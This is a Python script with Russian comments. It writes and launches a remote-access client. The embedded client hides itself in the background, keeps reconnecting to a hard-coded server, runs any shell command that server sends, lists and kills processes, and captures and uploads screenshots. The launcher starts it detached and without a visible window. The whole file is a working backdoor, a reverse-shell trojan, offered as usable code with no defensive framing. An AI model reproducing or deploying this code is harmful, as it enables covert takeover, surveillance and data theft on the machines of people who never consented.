import os
import sys
import subprocess
import time

CLIENT_CODE = '''\
import socket
import subprocess
import os
import time

SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        return output
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def main():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
        except Exception:
            # если не получилось подключиться, ждем и повторяем
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE).decode(errors='ignore')
                if not data:
                    break
                if data == "exit":
                    break
                if data.startswith("cmd:"):
                    cmd = data[4:]
                    output = execute_command(cmd)
                    s.send(output.encode(errors='ignore'))
                elif data == "process_list":
                    if os.name == 'nt':
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode(errors='ignore'))
                elif data.startswith("kill:"):
                    pid = data[5:]
                    try:
                        if os.name == 'nt':
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode(errors='ignore'))
                elif data == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f:
                            while True:
                                chunk = f.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))
                else:
                    s.send("Неизвестная команда".encode(errors='ignore'))
        except:
            pass
        finally:
            s.close()
        # при разрыве ждем и переподключаемся заново
        time.sleep(5)

if __name__ == "__main__":
    main()
'''

def create_client_file():
    filename = "client.py"
    if os.path.exists(filename):
        print(f"{filename} уже существует, пропускаем создание.")
        return
    with open(filename, "w", encoding="utf-8") as f:
        f.write(CLIENT_CODE)
    print(f"{filename} успешно создан.")

def run_client_in_background():
    # Запускаем client.py в фоне, без привязки к терминалу
    # Кроссплатформенно пока делаем простой запуск subprocess и завершаемся
    # Для Linux/macOS: nohup python3 client.py >/dev/null 2>&1 &
    # Для Windows: pythonw.exe client.py

    # Определяем команду запуска в зависимости от платформы
    if os.name == 'nt':
        # Windows
        pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(pythonw_path):
            # fallback на python.exe если pythonw нет
            pythonw_path = sys.executable
        # Запуск через CREATE_NO_WINDOW чтобы не показывать консоль
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen([pythonw_path, "client.py"], creationflags=DETACHED_PROCESS)
    else:
        # Linux/macOS
        # Используем nohup и запуск в фоне
        subprocess.Popen(["nohup", sys.executable, "client.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)

def main():
    create_client_file()
    run_client_in_background()
    print("Клиент запущен в фоне.")
    # Если хочешь, можно завершать данный скрипт сразу:
    # sys.exit()

if __name__ == "__main__":
    main()
